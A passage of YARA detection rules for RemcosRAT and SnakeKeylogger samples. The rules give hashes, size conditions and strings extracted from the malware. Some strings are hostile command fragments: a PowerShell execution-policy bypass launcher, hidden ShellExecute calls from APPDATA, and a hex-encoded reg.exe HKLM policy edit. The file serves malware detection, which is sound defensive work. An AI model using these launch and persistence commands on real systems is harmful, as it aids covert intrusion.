      description = "_subset_batch - file RemcosRAT(signature)_573bb7b41bc641bd95c0f5eec13c233b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ad47def129f96acbe890abe8e04dcf099c14a2acf5e1137c756c6239324bc03"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__573bb7b41bc641bd95c0f5eec13c233b_imphash__617e3044 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_573bb7b41bc641bd95c0f5eec13c233b(imphash)_617e3044.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "617e304402393e6229e7295054b276aa8d305f015ad03c7013582bb162598f5a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash__5135308d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_5135308d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5135308dec04eaf8d683adb9fdff45cbfceefdec51ee054a22fad2e771e1c65b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s5 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__cc8a485e {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_cc8a485e.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc8a485e552f058acef91ffaa910d757b41fe325c4974770953ea3066e3b6284"
   strings:
      $x1 = "LZWCU DESIZ,\"PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command %cd%\\IHYPB.ps1\" " fullword ascii /* score: '52.00'*/
      $s2 = "LZWCU GGDOB,\"DBSJN.ShellExecute APPDATA & \"\"\\DESIZ.cmd\"\", \"\"\"\", APPDATA, \"\"\"\", 0\" " fullword ascii /* score: '28.00'*/
      $s3 = "        Set colItems = objWMIService.ExecQuery(\"Select * from Win32_Process Where Name = '\" & prcName & \"'\")" fullword ascii /* score: '27.00'*/
      $s4 = "    Set colItems = objWMIService.ExecQuery(\"SELECT * FROM Win32_Processor\", \"WQL\")" fullword ascii /* score: '27.00'*/
      $s5 = "436F707972696768742028632920627920502E4A2E20506C61756765722C206C6963656E7365642062792044696E6B756D776172652C204C74642E20414C4C20" ascii /* score: '24.00'*/ /* hex encoded string 'Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED.' */
      $s6 = "3738393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5F606162636465666768696A6B6C6D6E6F70717273747576" ascii /* score: '24.00'*/ /* hex encoded string '789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuv' */
      $s7 = "504150414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E4758585041444449" ascii /* score: '24.00'*/ /* hex encoded string 'PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD' */
      $s8 = "5C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C4578706C6F7265725C55736572205368656C6C2046" ascii /* score: '24.00'*/ /* hex encoded string '\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' */
      $s9 = "4444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E475041" ascii /* score: '24.00'*/ /* hex encoded string 'DDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPA' */
      $s10 = "45464748494A4B4C4D4E4F505152535455565758595A202020202020202020202020202020202020202020202020206162636465666768696A6B6C6D6E6F7071" ascii /* score: '24.00'*/ /* hex encoded string 'EFGHIJKLMNOPQRSTUVWXYZ                         abcdefghijklmnopq' */
      $s11 = "65672E6578652041444420484B4C4D5C534F4654574152455C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C506F6C696369" ascii /* score: '24.00'*/ /* hex encoded string 'eg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Polici' */
      $s12 = "4E2E4E4E4E2F4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E" ascii /* score: '24.00'*/ /* hex encoded string 'N.NNN/NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN' */
      $s13 = "4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E30314E324E33344E353637384E4E4E393A3B4E3C3D4E4E4E4E4E4E4E3E3F40414E4E4E42" ascii /* score: '24.00'*/ /* hex encoded string 'NNNNNNNNNNNNNNNNNNNNNNNNNNNN01N2N34N5678NNN9:;N<=NNNNNNN>?@ANNNB' */
      $s14 = "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" fullword ascii /* score: '21.00'*/
      $s15 = "DBSJN.ShellExecute QFKLZ, \"\", EJKPU, \"\", 0" fullword ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x4827 and filesize < 18000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__59f93f15 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_59f93f15.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "59f93f15790d467f32f903f7ffb74a13ee87a97e05762a45833fa7238a14df79"
   strings:
      $s1 = "Z~%Fcq&$0W!fZ20&Z,0*Zfv90Z!Xc~08 3F!;*%2,;+fRso&2 /$yG*lXv;A%;T1*~%2*osooAs)fO32lvToF s$f8&$%+XGc3F G*%2ZZqc;&02lsX$lsswosw*FO3T" wide /* score: '19.50'*/
      $s2 = "O *FAGc%wsAo&+vf%A%9)R!&W+ZWf%wo3szZl2020/~%T!+*bR%T)~ss3oO,/cR3W&*yZWf%Z*ZT!ZFTcZc+*Rf%ZT!Z!!8/*%w!ws3sf0Zs$%ZT*W )0z*FooZ*osAo" wide /* score: '19.00'*/
      $s3 = "~%*!~3Z8c+/+,%$32!0FW/2%TZ!Z fWFR3!l*/&Z%f*ycc~0!l&*R+* ;v~%0 *+;vq!ZT!Z T0Rv%fTF!$%ZTZ!+G 2%2Z*yX*lc+cyc*fZZFW+cWA%OfXGZZW%9&*{" wide /* score: '18.50'*/
      $s4 = "cz0R%)~!wA%Z!ZT%z,/%A%/$Rvf~0swssZ1$sR2Zs$%TqW /cG0swsoXOsv03ZF* ;*G%{F*F!ZW%woswA3*w%3T8c ;*fR,Gl{T!Z!Fc$*T$G&f%OTcFvXfl!!TTFc$" wide /* score: '18.50'*/
      $s5 = "+c1%ZTFZA*)Z%2o/~%T!ZTZ!T~s~!!Z!ZT%2%3*Zc{TZZvA{&RG*8o$%+*2Z1*$XG*o*woswsofl%AXT~23*ZTZ!+Zv8A%R%;XfWb0!Z!TTZc,~0,R!GG*$%Z!Z!T!T1" wide /* score: '17.00'*/
      $s6 = "oZvvZ9AZ%!y3qZyZ~%/!XX+Ao!F{GF%T9FA%TTZ!T!Goy%oZFZ!!FcG*Z+ff&RGX/AA%lXZ;ZZ;//Z;Z;Z/Z//;Z/Z;/&;,/08c /XOf0FW+;*1G%~*GwGwoswso ;Go" wide /* score: '16.00'*/
      $s7 = "AGwcFW W*AR%/AR%q*ycvFo!wA%2o{sWslG1Z$TRfqfz3FGA9qG,2q9;!* W*~%T8cyc*~%WqcyZXAR%/$RFc~3&GA%8o{s;!W *c$0Rf$%8oGw 9f2!F*+Wc$%WqW /" wide /* score: '16.00'*/
      $s8 = "&;sX!Z T{WvZRTcycc~0{FO%+vfZoXR!* W*ARGq1RGZ$3y!*GwoZ!TZ!Z ZFsyqcF!Tsw!TTZ ZFoGycG+o*%W&WG+f*082*G80FZFTTZ,b*T8Zf%8q~%+;&2ssZs20" wide /* score: '16.00'*/
      $s9 = "GAoA2v/fZFf$08Z$%;TW /FARcFW ;*AR!qcyc{$Rv*FXZ;ZZ2/1ZA*~*qZ$+w*+ZF$sZ%/{~s!f/WGTf~f+v$l,8bvR!W{ G*0v+fT*FF!A3&R !8/f%2Z~%+!$3ZZ{" wide /* score: '16.00'*/
      $s10 = "sl0O*TwAR!!Z!ZqvR%3Z2c+/Wf%ZT!Z!!R$* W,~%T!TTZ!0AW+c~soTZ!!TTO%X%wT+sXR,l!s~%ZT!Z!q%z%3/2c ;*fR!!ZTT!WAW *,908!)vGqcFcTTZ!!TTZA*" wide /* score: '16.00'*/
      $s11 = "l!!ZT!Z fl0o!ZZl%osoo;Z$2R3A;A0oZfG*T2*1&y*FF$RbAA%Os~0Gl*X!8c+/lA%2XFlF*2/T!Z!R!*&*/8%$*GX2lsXT;&&oows3Z+*R2$;ARAb2szoARf/AR!/f" wide /* score: '16.00'*/
      $s12 = "ARcq*yZvO0Z2c WX$%R W /c$0;** W{AR%9/F22$flc/FF9;boZcZ&Z2%2T,RsTswsoow* ZT G&%F/$%Rs2!T!+92%f!2TcZ,*9RF {oW&* W*~%T2cyZc~%;qcyZX" wide /* score: '16.00'*/
      $s13 = "FG{W!fl,2Z W W*,RGXvl&T$R c8qAR**ZTT!ZFR * /1~%f*ZT!Z!q0yc /0~%T!yT2*qA%A!!Z!Zq!y%$&;AX3l!Z2fvZ,%wToswswsX q/wbo!yT%A&0f;sboT8Z$" wide /* score: '16.00'*/
      $s14 = "ZR3vlA/$RGf$0Zc* W{wsqlF;A28*2T*F,/*RGTXFF!ZTvwZ!+*$%R!AGT!3f2%1Z2T%;A0TZ!!3T;v02A/~%$Z*F,Zl%R/AR!T!Z2T9;%2A/AR!c~3/!WZ2%T!TT2 *" wide /* score: '16.00'*/
      $s15 = "bl0sZvoXR!!TT8 oFR3; *yZWf%Zs~0,l!T!Zcf$W%2R/AR!&W+**G%Z*/F*+Wc9%;3ZFZ+*yZc$f8c)%WTO%)RcZccw!Wqcyc{,2!/f2%&W+clA%Rq3G; W /c1fWF*" wide /* score: '16.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 8000KB and
      8 of them
}

rule RemcosRAT_signature__c4a0f33b {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_c4a0f33b.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c4a0f33bd3f79a4ea9ed0219d19fd905a6d559f19bf3d57c50beff226f75b225"
   strings:
      $s1 = "*l*TTW! /9lZTc;fRsowswsGZ%A0 8GosRFq{wsZ8qGws,y$0%ZcyZ*A0*Zc/&Rosws$ozA%30Zc+cFow*Xws~%&;!ZT!Z!f!RA+TO%!8* W*AR0TcycWA0fX/Zc/&Ro" wide /* score: '16.00'*/
      $s2 = "w*0,lTwA0wsws&A2802F*oZ~%/Tl*AR1 WGsw0o&Rswsof9/w%3s;$%;!XX~%%fXFvo*R1l!o~%wssw AocR2oZ~%*qW cl9%F*AWX{vw*R,X!o$Rsosw+sO%03RZA0T" wide /* score: '16.00'*/
      $s3 = "lFX&;T!Z!+TRcc/qRAXfl3lsX+Z~%FwZF9s~&TF2Zf0FcswosZf*l03A;AR%9&T*Z!3F;0*W /XG%G/$RbqfF9wAfwsws!GA+02Rv* ;c90Z&cy/v~%swoo!G%F%3%**" wide /* score: '16.00'*/
      $s4 = "GAfZ9GZ!!ZqTswf2 qcT9RGqAR* W /XO%,9$RboAR{lvXl*2*%yZAf%2ZT!Z!+TZcc;q%~*fl3Xslv;A0Fo/Ff9A2TFFZf02csoowc3*z0As/~%Rs&ZcZT28ZT*W /{" wide /* score: '16.00'*/
      $s5 = "$RZT l$%AF10A!A0TZ!T!Z1R,3R*Gsb+%ZXGwsX%;!3{~%GlTFW cl$0ZZcyc*A0TZ!T!Z+bl%oTZZ*0owsofA/y%3AZ~%&GAR1FGG*!A*1fZ!fl$%;!cy**,R!8c+cX" wide /* score: '16.00'*/
      $s6 = "&~2oswsoo2*%~{!lGvwX0bwARGXFo$RvX&;T!Z!TTW%c/qRAXfl3lsXwswssw&l0Al!$2FZ$0wssw*282%A$/AR!Z!T,q+A%3f;$%F!$3Z!!TTZ TvZ{;%TlGws*R,l1" wide /* score: '16.00'*/
      $s7 = "TZ!T Zo!R%oTZZ*01l,Xswow 3W R2!l%8* Wc9%Z!TTZ! RX%w! R/f*lA;A0!q*ycXfRTFW *{O%!+*yc{,RoWFTyGG%b8cZ)%ZF* W*$0Z!!Z+!F 2RoTsw*R!*!T" wide /* score: '16.00'*/
      $s8 = ",lTFW *X~%soowsoZR0AvXW!FGfR!8* W*$%zs$0F*vlosws%w1f,A2lcT /fR2/ARo*wsooRs**0As/AR/Zc+W*~%!Z!Z+!;sq%O%qTFcfR1!+G!w$f!Z!Z&T!TqR,0" wide /* score: '16.00'*/
      $s9 = "+%A%8c+Z*9RZTAATcZZffwsso3w29cRoZZqW Wc,2A8XGZZX%;F*/2%swos;sbl03*l!l%*c+*Wf0!lTcW **G%!X02c+cW9R!XZcwv,Rcy* Wc9%wZ$0W cy*cO%%y*" wide /* score: '16.00'*/
      $s10 = "%+scy*/&Rswso2o9A%3!lTF;2f0Z!!T+Z!+vR{~sTZ*W!2WARq*8*q*8!q32%FZT22%GZ13F;AZ%3F/0;A0!ZT!2!+q+%G$oZ&/2lowsows2*%~GZXG+sX%8s$0+*&;1" wide /* score: '16.00'*/
      $s11 = "WA3!ZXW 1RflFswv2osZ*TZ2&9TlG!;*%O*swoo2wby%32/$RFX%8* W*$0W c+/W,0%;*WsTWFW cW,R0 W /cG%0X2*,l1*ZZ*RTT!ZvZcXc+*~A0!Z+!Zc/fR2!XT" wide /* score: '16.00'*/
      $s12 = ",X1l!T Z3 ;f03F*!X/Wc+cW9RsoAsZ%bA%AT&W /cG%ooAs!RfsR2%8*+ZWfRso2oTOZ/%A$Z~%TXO*so3wA0F;0AZqW ;cfR!G$%ws3sA,TXR2%2* ;cfRTX!Z!Z&T" wide /* score: '16.00'*/
      $s13 = "*Z!T!W!10R2!Z{cG&!w00AR%yc+c*f8sTv+TZF*oTW!!3q;%+cy*lf0Z!Z!!Zc~* W%$%Z!TT2!bR*%w!vwX0!Z!Z&T 1*RsTswX%W *+WG,008c+ZF1R o~%RsAR!ZT" wide /* score: '16.00'*/
      $s14 = "Z!b+fclGvlTT!ZGWff&$92!0!Z0!yZ9Xl2A0$l!*2lT;&fwsAs2O W02Z!T!Z!0$W ZR9%ws2w312W%A!T!TTZ!)cy/%G%ooAsf1fR%3!ZTZ!TR%W ZRfRosAs9,w%03" wide /* score: '16.00'*/
      $s15 = ";A0wswsA8 A02Z * ;c90ZsARosws&y99%AswsosofF*0sZosRsf0O*!T+Z&9GZ0AZ*FGws!Z!Z{!Zv02R *+;cfRq*8*A;$+%8cyZ*A092*{Z8* Wc1f+Fc+*Wf0%G$" wide /* score: '16.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 8000KB and
      8 of them
}

rule SnakeKeylogger_signature_ {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6d6d0e56950402b84ea721cd06cd329629d6b64e885923533de5b1c33b50d15c"
   strings:
      $s1 = "FqT82TZ+qFZF+TF!!T+8*Tf8XZfqA!y!!ZGZ3!l!9F8!TTl!2Z+!8!!Z*T2Z%Z2T TTZ*T*Z9FA!qTZ!*TT+ qFZq+ qlFZ!!Z%ZX!GF9Fl!9q8!!y{!A!%8XTf8 Z!+" wide /* score: '14.50'*/
      $s2 = " FGlvq T*l!TFZT!8!3qZ!!TTZ!T!Z0Z!T8!R!%~!RqF+!*!ZAT08FvZ*!WA!RqqvZcZ%q%qqZ!TcZ+!Z!TT2!,T+ZFT!Z*Z,TRF8!!ZcZ0!ZbT%8FTqZb!RqFZF%ZfT" wide /* score: '12.00'*/
      $s3 = "Z!T~!O!%8,Z+!Z!X!O!3TA!%8TFO!cZTT%Z%ZvT TXZfqvZf!Z!TTZ!cT*Z!T!ZTZ%TW!Z!!Z!ZT!W!1!+!+TO* 8" fullword wide /* score: '12.00'*/
      $s4 = "!2!!W+qvZ&Z,* qqlFq!80!y!T+R!Zq9W qFlq8!qR!R!,W 8X!Z /!O!3T8!!y*!8*F83TFZ!y*TFXq8!q%Z0!R!fTZ %TT2 qFZqZ!+l!RF%ZFZT!W!q*8FTqR!%Z0" wide /* score: '12.00'*/
      $s5 = "!Oc+q8!FZT l!Z89* 8c2 qZq1W qcZT z!0q;FFT+Z!+*Z9y qZ!R!cZ!Zq!y!3!A!+TZ!*Z3!ZF ZqT!Z*Z,T,T1Z T!ZX!l!9qy!FTTZ*T*8qZ%qO!R!F2 8X!GF1" wide /* score: '12.00'*/
      $s6 = "AZT+GT+22!,O&ZqZ8FT*2!q1R!%G* FA&Zq1AZ,l2qc+fZF1&Z$ yF+*2!,0$ZsqZ8f8&TOG2!b8 8f*2!1%~!X+WF,yf!8vAZoqZ8&y&T,{$Z%q%Z)22!1{~! q*yc9" wide /* score: '12.00'*/
      $s7 = "T!Z!Z&qF1TZ*T!ZT!+F)9Z!cTTZ!TZ8)2!T2!Z!!Z y$vZ!+!Z!TTy  +T!8!!ZTTGZZw!T TTZ!T!yofZ!qTZ!!T$8G{!ZqZ!TZ!8 s+!Zq!Z!T!G!0*Z!&ZT!Z!&8q" wide /* score: '12.00'*/
      $s8 = "T!Z!Z!T!TqyfT!Z+!Z!q0W!%9TZFT!ZTZ!TZ!Z vw!Zq!Z!1GW!/3Z!F8T!Z!!ZTTcyZz!TFTTZGX%yTvR!fqZ!!TTZ!TcyTO!T8!Z! lfyqFR!fFZ!TTZ!!Z* WG!Zq" wide /* score: '12.00'*/
      $s9 = "yvTZ!8!%l%y1!8F)!; /T8FZZfFO!!ZTTfZG8ATb1" fullword wide /* score: '12.00'*/
      $s10 = "Fw!F81q&8bZ!T!T$2%+bZT!Z!{$R sTq8%qF8{8Fq+F8Fc8F8fF8F)!Z!TT~&%y+F8FsZfqZOG8vq*+qZ!T!ZT%G%0qRF&q*8Gq&8*8vq2FlFF8*8fFyb)!Z!qTlc%yT" wide /* score: '12.00'*/
      $s11 = "Fl qTZ!!ZT%G%%8)+&8c8,+&q*8%+&8XF8FXq2FATq8 )Gyq8v+8Fl F8GyfFZGT!wc+qyGvyfFFF*yfqAZF8 )FTTZ!T2W/%F!qq+FATq8AT&8qZ!TZ!2!fR%8* 2FT" wide /* score: '12.00'*/
      $s12 = "FZFF8/+&8bZ!T!T$2%+bZT!Z!{$R !qq8A+F8)yFqO 8F*yF8* 8F)!Z!TT~&%yf 8F!8fqZOG8vq*+qZ!T!ZT%G%0q~ &q*8b+&8*8,+2F+FF8v8fF;!qFyb0+8FGyq" wide /* score: '12.00'*/
      $s13 = "fFF{T8F!ZT!W!!ZTTAZ!RbT!TTZ,*%y9!8F*TZ!!T$Z2{fZf8bTZ!Z!AF%y+bZGT!W /TyGZ8X yb*ZqqA8*y )!{TZ&+bw+GzFX+ybcTq8,q*y+z!{Z!~ cR F0Fl +" wide /* score: '12.00'*/
      $s14 = "cO&GZ$TbZ!Z!TAX0yvT!Z)!z!TTZ!,*0y!{!Z92!{yGz!!ZFZ9FR /FwFTT8F!ZT!2c!ZTTFZZF!TcTT2AqFZT!Z!X*Z!!TTZ!q!ZTZFTzvZ!!ZFZ{*Z!T!Z!fqZ!!ZT" wide /* score: '12.00'*/
      $s15 = "* Fv8*+FTTZ!T!W9%GF9*; ZTq8ZT&8ol&TAs+FbZ!ZT!+*0 +FT{Z!FZ9 yG*Zqq&Z2wvqbTTZ!Tvl0 +FT{Z!FT9y {cZq8!Tl!2FvZ!ZT!ls0 z!TTZ!%Fov+!!Zq" wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__b5c26158 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_b5c26158.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b5c26158818ec4e36dc397d56fa75aad40737a74e5f326846534f0ba83925c44"
   strings:
      $s1 = "!WTc~!0q8v!*TRF0F8TZ!*Z Z!!Z!2T,Z TFZ!T*Z,!RqFZ!!WT0!ZbZ%qFTqZbT%8q!8%TfZ! /TOc+FZ)Z%q8!8!bZ%8q!8%T&Z!+9ZZFG* 8%!Z)T%8FZFTbT08FT" wide /* score: '16.00'*/
      $s2 = "f!2 2*f!fq2Ff!2T&Z&TfZ&!fq2%f%2f2&f8&2&F2v2q&y&q&2&q*8cc2{&8cF2Tf!2!2!f!f02cf%2+&+c**2&FfX2!fF2q2cfZc8&GWF2T&Z&T&Z&Tfl&c2f&F&v2T" wide /* score: '12.00'*/
      $s3 = "!FT%Z%T0Z%!0TW!{!+TA!98 Z2!GFZq Z T%Z%T0Z !yT%Z%!AT9FR!R!0!0Ty!TFFT*8AT3ZF!TTW!*G8qGFfZFZ&%8FzTFZ!TvZ%{q8fF2T%Z%!FT{!y!y!+!+Ty!+" wide /* score: '12.00'*/
      $s4 = "F8Zv8q3!O!F!+F3Ty!+!yT*Zfq+Z%!0TA!3!ATZG+8 Z2!R!RT%ZFqGZ*qq+ %yq!Z! lTXF8%yF3!+Ty!+!lTf8 T0Z%!3TA!3!Z{yF+Z2Zs!F!lq*8F0 82T0l FlT" wide /* score: '12.00'*/
      $s5 = "Ty!+!yTy!98Z8fFy!yT2Z%T2ZfqT+ F;qZ8 !8$+%yFOvq%+qA!0!ATf8 T1+F%+qR!1v80yF98,+F%yFGq*Zfq*Zfq3Z*!Gq2ZfFZ" fullword wide /* score: '12.00'*/
      $s6 = "+8!v+q8!9by08FX8 Z!vyF8TF+ q*8vT{ZcFO) RFFATq!Z!+!Xb+08FXA80 8FT+Z!!1Ty!+!yTl!98%Z*!GFGq Z T Z*T98%!lTf8fFRTX!GFR!X!9qZF{!zq Z T" wide /* score: '12.00'*/
      $s7 = "Z2Z%!R!RT%Z%TvZGT0Zf&80 8F!8TT +!G +F9f8%+FyTGZGT/82!qTZ!*!;q;F/8 Z!!l!O+ 8fq!Z!TXZc yqFZG!WTX 8%yFX q0yFq!ZT%ZF++8F!{TW!q 80yF3" wide /* score: '12.00'*/
      $s8 = "2W!{q+ G{X+F+!WXZ!qZ!ZF!AFZT!Z!T!Z!T0Z!!8T%Z%AZ0qF+!W!TAT08F" fullword wide /* score: '12.00'*/
      $s9 = "!+TO*+F+T&Z!*+8v!fTOc+F8X8FT8%Z !Z RTZ8f* 8FXq8!FRT%Z,cyqX!Z ;!1!3T8!T WTFlFq3ZF!T+l!q*8qZF0Z%Z%!2!Z+%Z!f 8FTqZ! lT%8%!8TT!W!8*q" wide /* score: '12.00'*/
      $s10 = "Z&!Wf 8ZF8T+!Z +!1c+q8!q!Z+*ZZq9W F*fyF/FO*yF*Z!yb!RF;qFZ T!y*T9y FZT%Zc!ZTq!y!A!3!+TZ!X!AT!8 TqZ!!XTO!1!OTy!TZ*Z*!GFyTFZ!T*Z*qq" wide /* score: '12.00'*/
      $s11 = "+!T!8T&l%+)Z!!TTOc0 Z{Z!/lvF GlF8qcZ!T!Zf13F!!lq&8cF8qX!; O qF1+2F)!ZT!Z*90ycFqqyF$ ZTlFf8&8FFF!;+%yFq%y&q)Z!!ZT*G% 2qqF+ ~ T!Xq" wide /* score: '12.00'*/
      $s12 = "oZFF/9Z!)!ZTZ!qZs+!F8FRTZy!qF8!T3Z2fwT&8A ZTT!l!wvqFqqyFqFyq&8bTTZF!f02GqF2qz!TZ!Zc%wvZqF8!q&8bTTZF!y0&FG!ZTT!Z!8!+ 1fA!qFAT&8,T" wide /* score: '12.00'*/
      $s13 = "ysswobw* woosOs8sosooOs92wosw,o1~ssooOs/,wows1wfFsswsOo +sosw,oXlsswo,wZcwoosOsy&osoozs3vwosw,o9yssooOs{ wows1w!ZsswsRo!wsosw%o1" wide /* score: '12.00'*/
      $s14 = "FoT8F1F2qbZ!TTZA&0+z!T!ZTFA0ysZFFRF8qG8Fqv8Fq*8FF2qF8b!ZTT!~&R +Fqqw!fF;1G8vqXyF!TTZ!T%G0RF08&8cFFF2qc8vq&8*qq8*F2q zb!ZTq!lcR T" wide /* score: '12.00'*/
      $s15 = "FZ{Z!$W,Z GWFzT!Z!TA2%+0Zf!+qvyb!ZTT!zbR {F*qWF*Fy)!F!ToWA&+{+FX 8TZ!TZ&Zf%FFZ{!Zb*GA {*8b!ZT!ZA&R+0!;!+!T!qTwFfG+T!Z!TfZs,1fF!$" wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__e7c6b5f7 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_e7c6b5f7.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e7c6b5f74086a64754c4b3509f5ae45cb09f685818af6f6082c25ad222374788"
   strings:
      $s1 = "2!* 2TW *2&R&F2v2T&Z&T&Z&TfZ&!2T&Z& 2+f*2c2!f!f*2!fF2Tc+&1*y&!fqWcf%2q2Ff8&Z&!2!2T&Z&T&Z&Tfy& 2T&y&!2Tf&2!2&f!**WFfc2T&W&XfR&!ff" wide /* score: '14.50'*/
      $s2 = "&O&T&Z&ffy&!2Tcl& 2*f!2v2,f!fTW fF2T&ZcXfy&cfT2GfG2T2!f2&8&!2!WX&y&*&ZcXf+&!2Tcy&!2Tf!W*2 fvfT2%f%2T&Zc+*y&!fT2,f 2X2!fl&Z&!2!2f" wide /* score: '14.50'*/
      $s3 = "* 2c2Gfcfq2G*F2*&y&" fullword wide /* score: '12.00'*/
      $s4 = "* 2c2%fcfq2Gf&2*&y&" fullword wide /* score: '12.00'*/
      $s5 = "* 2c2Gfcfq2cfG2*&y&*f8&vf+2cfF2*2*fW&F&c2F2{&l&*&y&Xf8&v2q&W&F2" fullword wide /* score: '12.00'*/
      $s6 = "* 2cW fcfq2vfG2*&8&*f8&vf*2cfF2" fullword wide /* score: '12.00'*/
      $s7 = "* 2c2Gfcfq2cfG2*&y&Xf8&cfq2cfF2" fullword wide /* score: '12.00'*/
      $s8 = "* 2c2Gfcfq2cfG2*&y&Xf8&cfq2cfF2X2FfW&8&c2F2{&F&*&8&*f8&c2q&W&F2*fF2c2Ffcfq2cfF2*&8&*f8&cfq2cfF2X2*fW&F&c2F2{&W&*&y&Xf8&*21&W&F2f" wide /* score: '12.00'*/
      $s9 = "* 2c2Gfcfq2Gf,2*&y&*f8&vf*2cfF2*WcfW&+&c2F2*&y&*&8&*f8&c2q&W&&2{fG2c2*fcf+2GfG2*&2&*f8&cfq2cfF2*2FfW&8&c2F2*&8&*&8&" fullword wide /* score: '12.00'*/
      $s10 = "* 2c2*fcfq2v*&2*&y&*f8&vf+2cfF2" fullword wide /* score: '12.00'*/
      $s11 = "* 2c2*fcfq2vfv2*&y&" fullword wide /* score: '12.00'*/
      $s12 = "* 2c2&fcfq2cfF2X&l&" fullword wide /* score: '12.00'*/
      $s13 = "* 2cWvfvf{2*f 2*&l&Xf8&cfq2vfG2X2,fW&8&c2c2*cW&*&l&" fullword wide /* score: '12.00'*/
      $s14 = "* 2cWcfvf{2*f&2" fullword wide /* score: '12.00'*/
      $s15 = "* 2vW*fcfX2cf 2*&l&*f8&cf12cfv2*2*fWcW&v2G2X&y&*&l&Xf8&c2q&+&G2Xf,2*2FfGf" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule RemcosRAT_signature__be5e11f6 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_be5e11f6.js"
